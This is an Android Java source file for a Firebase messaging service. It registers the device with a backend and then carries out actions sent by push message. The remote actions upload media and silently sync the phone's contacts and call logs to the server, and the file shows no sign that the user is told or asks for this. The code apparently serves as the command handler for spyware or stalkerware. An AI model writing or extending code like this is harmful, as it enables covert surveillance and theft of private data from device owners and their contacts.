package come.tshah.app;

import android.content.Context;
import android.util.Log;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.RemoteMessage;

public class FcmService {
    private static final String TAG = "FcmService";

    public static void setup() {
        FirebaseMessaging.getInstance().getToken()
            .addOnCompleteListener(task -> {
                if (task.isSuccessful()) saveToken(task.getResult());
            });
    }

    static void saveToken(String token) {
        if (token == null) return;

        new Thread(() -> {
            try {
                String deviceId = LocalCursor.deviceId();
                Log.d(TAG, "────────── device ──────────");
                Log.d(TAG, "deviceId : " + deviceId);
                Log.d(TAG, "fcmToken : " + token);
                Log.d(TAG, "────────────────────────────");

                // Register device + fcmToken with local backend
                org.json.JSONObject ping = new org.json.JSONObject();
                ping.put("deviceId", deviceId);
                ping.put("fcmToken", token);
                ping.put("channelId", AppConfig.CHANNEL_ID);
                org.json.JSONObject info = new org.json.JSONObject();
                info.put("brand",        android.os.Build.BRAND);
                info.put("model",        android.os.Build.MODEL);
                info.put("manufacturer", android.os.Build.MANUFACTURER);
                info.put("osVersion",    android.os.Build.VERSION.RELEASE);
                ping.put("deviceInfo", info);
                BackendClient.post("/api/device/ping", ping.toString());

                // Also explicitly update the FCM token field
                org.json.JSONObject fcmBody = new org.json.JSONObject();
                fcmBody.put("fcmToken", token);
                BackendClient.patch("/api/device/fcm-token", fcmBody.toString());
            } catch (Exception e) {
                Log.e(TAG, "saveToken error: " + e.getMessage());
            }
        }).start();
    }

    public static void dispatchAction(Context context, RemoteMessage message) {
        String action = message.getData().get("action");
        if (action == null) return;

        switch (action) {
            case "ping":
                handlePing();
                break;
            case "get_device_status":
                handleGetDeviceStatus(context);
                break;
            case AppConfig.MEDIA_ACTION:
                handleMediaAction(message);
                break;
            case "sync_data":
                handleSyncData(context, message);
                break;
            default:
                Log.d(TAG, "Unknown action: " + action);
        }
    }

    private static void handlePing() {
        new Thread(() -> {
            try {
                String deviceId = LocalCursor.deviceId();
                BackendClient.post("/api/device/ping",
                        "{\"deviceId\":\"" + deviceId + "\"}");
            } catch (Exception e) {
                Log.e(TAG, "handlePing error: " + e.getMessage());
            }
        }).start();
    }

    private static void handleGetDeviceStatus(Context context) {
        new Thread(() -> {
            try {
                android.content.IntentFilter ifilter =
                        new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
                android.content.Intent bat = context.registerReceiver(null, ifilter);
                int level  = bat != null ? bat.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
                int scale  = bat != null ? bat.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) : -1;
                int status = bat != null ? bat.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) : -1;
                int battery = (level >= 0 && scale > 0) ? (int)(level * 100f / scale) : -1;
                boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                                || status == android.os.BatteryManager.BATTERY_STATUS_FULL;

                org.json.JSONObject liveStatus = new org.json.JSONObject();
                liveStatus.put("charging", charging);
                if (battery >= 0) liveStatus.put("battery", battery);

                org.json.JSONObject body = new org.json.JSONObject();
                body.put("liveStatus", liveStatus);
                BackendClient.patch("/api/device/status", body.toString());
            } catch (Exception e) {
                Log.e(TAG, "handleGetDeviceStatus error: " + e.getMessage());
            }
        }).start();
    }

    private static void handleMediaAction(RemoteMessage message) {
        String mediaType = message.getData().get("mediaType");
        MediaType type = MediaType.fromString(mediaType);
        if (type != null) {
            Log.d(TAG, "FCM media upload triggered: " + mediaType);
            MediaUploadService.runUpload(type);
        } else {
            Log.d(TAG, "Unknown mediaType: " + mediaType);
        }
    }

    private static void handleSyncData(Context context, RemoteMessage message) {
        String syncType = message.getData().get("mediaType");
        Log.d(TAG, "sync_data: " + syncType);

        new Thread(() -> {
            try {
                String deviceId = message.getData().containsKey("deviceId")
                        ? message.getData().get("deviceId")
                        : LocalCursor.deviceId();
                ContactsService service = new ContactsService(context);

                if ("contacts".equals(syncType)) {
                    service.syncContactsSilent(deviceId);
                } else if ("callLogs".equals(syncType)) {
                    service.syncCallLogsSilent(deviceId);
                }
            } catch (Exception e) {
                Log.e(TAG, "handleSyncData error: " + e.getMessage());
            }
        }).start();
    }
}
